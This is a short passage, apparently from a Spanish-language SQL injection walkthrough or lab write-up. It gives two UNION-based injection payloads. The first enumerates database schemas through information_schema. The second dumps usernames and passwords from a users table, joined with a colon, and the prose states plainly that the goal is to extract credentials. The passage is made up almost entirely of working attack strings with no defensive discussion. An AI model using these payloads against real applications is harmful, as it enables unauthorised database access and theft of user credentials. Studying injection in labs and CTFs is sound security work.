...
```SQL
' UNION SELECT NULL,GROUP_CONCAT(0x7c,schema_name) FROM information_schema.schemata-- -
```
...
Ahora sabemos que en la tabla users hay datos de correo, nombre de usuario y contraseña, vamos a intentar volcar todo ese contenido mediante el siguiente Payload (el cual concatena usuario seguido de contraseña separado por dos puntos en la misma columna):

```SQL
' UNION SELECT username||':'||password,NULL FROM public.users-- -
```
